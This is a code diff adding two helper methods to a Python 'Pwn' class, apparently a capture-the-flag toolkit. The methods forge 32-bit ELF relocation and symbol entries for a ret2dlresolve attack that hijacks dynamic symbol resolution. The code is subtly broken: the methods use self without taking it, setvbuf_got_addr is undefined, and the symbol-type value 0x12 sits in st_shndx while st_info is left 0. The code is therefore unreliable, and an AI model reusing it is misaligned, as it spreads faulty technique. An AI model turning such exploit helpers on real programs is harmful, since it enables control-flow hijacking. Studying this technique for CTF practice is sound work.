@@ -114,3 +114,39 @@ class Pwn():
         while True:
             if not f.exist():
                 break
+
+    def make_reloc_32(sym_addr):
+        R_386_JMP_SLOT = 0x7
+        sym_obj_size = 0x10
+
+        dynsym_section_addr = self.elf.get_section_by_name(".dynsym").header["sh_addr"]
+        sym_arr_idx = (sym_addr - dynsym_section_addr) // sym_obj_size
+
+        r_offset = setvbuf_got_addr
+        r_info = (sym_arr_idx << 8) | R_386_JMP_SLOT
+
+        reloc = b""
+        reloc += p32(r_offset)
+        reloc += p32(r_info)
+
+        return reloc
+
+    def make_sym_32(fname_addr):
+        dynstr_section_addr = self.elf.get_section_by_name(".dynstr").header["sh_addr"]
+
+        st_name = fname_addr - dynstr_section_addr
+        st_value = 0
+        st_size = 0
+        st_info = 0
+        st_other = 0
+        st_shndx = 0x12 # 0 is also okay usually
+
+        sym = b""
+        sym += p32(st_name)
+        sym += p32(st_value)
+        sym += p32(st_size)
+        sym += bytes([st_info])
+        sym += bytes([st_other])
+        sym += p16(st_shndx)
+
+        return sym
